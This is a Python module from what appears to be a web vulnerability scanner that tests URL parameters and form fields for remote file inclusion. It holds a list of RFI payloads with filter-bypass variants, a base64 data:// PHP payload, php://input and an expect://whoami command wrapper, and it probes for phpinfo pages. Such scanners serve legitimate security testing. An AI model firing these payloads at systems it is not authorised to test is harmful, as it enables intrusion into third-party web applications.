"""
cyberm4fia-scanner - RFI Module (v2)
Remote File Inclusion detection (Threaded)

Improvements:
  - Only tests existing URL params (no fake param injection)
  - Adds protocol bypass payloads (data://, php://, case-mixed)
  - Pre-checks allow_url_include via phpinfo detection
  - Baseline comparison to reduce false positives
"""

from utils.colors import log_info, log_success, log_vuln, log_warning
from utils.request import (
    get_thread_count,
    increment_vulnerability_count,
    smart_request,
)
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.request import ScanExceptions

# RFI Payloads — multiple bypass techniques
RFI_PAYLOADS = [
    # Standard HTTP includes
    "http://google.com/robots.txt",
    "https://google.com/robots.txt",
    # Case-mixed bypass (for str_replace filters)
    "hTTp://google.com/robots.txt",
    "hTtP://google.com/robots.txt",
    "HTTP://google.com/robots.txt",
    # Null byte bypass (PHP < 5.3)
    "http://google.com/robots.txt%00",
    "http://google.com/robots.txt%00.php",
    "http://google.com/robots.txt?",
    # Double encoding
    "%68%74%74%70://google.com/robots.txt",
    # Data URI (doesn't need allow_url_include on some PHP versions)
    "data://text/plain;base64,PD9waHAgZWNobyAnUkZJX1RFU1RfU1VDQ0VTUyc7ID8+",
    # PHP wrapper
    "php://input",
    # Expect wrapper
    "expect://whoami",
]

# Signatures indicating successful RFI
RFI_SIGNATURES = [
    "User-agent:",
    "Disallow:",
    "RFI_TEST_SUCCESS",  # Our data:// payload output
    "Allow:",
    "Sitemap:",
]

# File-like param names (only test form fields matching these)
RFI_PARAM_NAMES = [
    "file",
    "page",
    "include",
    "path",
    "template",
    "doc",
    "folder",
    "lang",
    "url",
    "uri",
    "view",
    "content",
    "load",
    "read",
    "inc",
    "require",
    "src",
]

def _check_url_include(url):
    """
    Try to detect if allow_url_include is enabled.
    Checks phpinfo pages if accessible.
    """
    phpinfo_paths = [
        "/phpinfo.php",
        "/info.php",
        "/php_info.php",
        "/test.php",
        "/i.php",
    ]
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    for path in phpinfo_paths:
        try:
            resp = smart_request("get", base + path, delay=0)
            if "allow_url_include" in resp.text:
                if 'allow_url_include</td><td class="v">On' in resp.text:
                    return True, "ON"
                elif 'allow_url_include</td><td class="v">Off' in resp.text:
                    return False, "OFF"
                # Fallback text check
                if "allow_url_include" in resp.text and "On" in resp.text:
                    return True, "ON"
        except ScanExceptions:
            pass

    return None, "UNKNOWN"  # Can't determine

def detect_rfi(text, baseline_text=""):
    """Check if response indicates successful RFI with baseline comparison."""
    text_lower = text.lower()

    for sig in RFI_SIGNATURES:
        if sig.lower() in text_lower:
            # Must not be in baseline
            if sig.lower() not in baseline_text.lower():
                return True, sig

    return False, None

def _get_baseline(url):
    """Get baseline response for comparison."""
    try:
        resp = smart_request("get", url, delay=0)
        return resp.text
    except ScanExceptions:
        return ""

def _test_rfi_param(param, params, parsed, delay, baseline_text):
    """Test a single param for RFI."""
    for payload in RFI_PAYLOADS:
        test_params = params.copy()
        test_params[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
        try:
            resp = smart_request("get", test_url, delay=delay)
            found, sig = detect_rfi(resp.text, baseline_text)
            if found:
                increment_vulnerability_count()
                log_vuln("RFI VULNERABILITY FOUND!")
                log_success(f"Param: {param} | Signature: {sig}")
                log_success(f"Payload: {payload}")
                return {
                    "type": "RFI_Param",
                    "param": param,
                    "payload": payload,
                    "signature": sig,
                    "url": test_url,
                }
        except ScanExceptions:
            pass
    return None

def _test_rfi_form_input(
    inp, inputs, hidden_data, method, target, delay, baseline_text
):
    """Test a single form input for RFI."""
    for payload in RFI_PAYLOADS:
        data = {n: "test" for n in inputs}
        if hidden_data:
            data.update(hidden_data)
        data[inp] = payload
        try:
            resp = smart_request(
                method,
                target,
                data=data if method == "post" else None,
                params=data if method != "post" else None,
                delay=delay,
            )
            found, sig = detect_rfi(resp.text, baseline_text)
            if found:
                increment_vulnerability_count()
                log_vuln("RFI VULNERABILITY FOUND!")
                log_success(f"Form field: {inp} | Signature: {sig}")
                log_success(f"Payload: {payload}")
                return {
                    "type": "RFI_Form",
                    "field": inp,
                    "payload": payload,
                    "signature": sig,
                    "url": target,
                    "method": method,
                }
        except ScanExceptions:
            pass
    return None

def scan_rfi(url, forms, delay, threads=None):
    """Scan for Remote File Inclusion vulnerabilities (threaded)."""
    if threads is None:
        threads = get_thread_count()

    log_info(f"Testing RFI with {len(RFI_PAYLOADS)} payloads ({threads} threads)...")

    # Pre-check: detect allow_url_include
    enabled, status = _check_url_include(url)
    if enabled is False:
        log_warning(
            f"  ⚠️  allow_url_include={status} — HTTP-based RFI unlikely to work"
        )
        log_info("  → Still testing data:// and php:// wrappers...")
    elif enabled is True:
        log_success(f"  ✅ allow_url_include={status} — RFI possible!")
    else:
        log_info(f"  allow_url_include={status} (phpinfo not found)")

    vulns = []
    baseline_text = _get_baseline(url)

    # Only test existing URL params
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    existing_params = list(params.keys())

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = []

        if existing_params:
            log_info(
                f"  → Testing {len(existing_params)} URL params: "
                f"{', '.join(existing_params)}"
            )
        else:
            log_info("  → No URL params to test for RFI")

        for param in existing_params:
            futures.append(
                ex.submit(_test_rfi_param, param, params, parsed, delay, baseline_text)
            )

        # Forms — only test fields with file-like names
        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            target = urljoin(url, action)
            all_inputs = form.find_all(["input", "textarea"])
            inputs = [i.get("name") for i in all_inputs if i.get("name")]
            hidden_data = {
                i.get("name"): i.get("value", "")
                for i in all_inputs
                if i.get("type") == "hidden" and i.get("name")
            }

            file_fields = [inp for inp in inputs if inp.lower() in RFI_PARAM_NAMES]

            for inp in file_fields:
                futures.append(
                    ex.submit(
                        _test_rfi_form_input,
                        inp,
                        inputs,
                        hidden_data,
                        method,
                        target,
                        delay,
                        baseline_text,
                    )
                )

        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    vulns.append(result)
            except ScanExceptions:
                pass

    return vulns
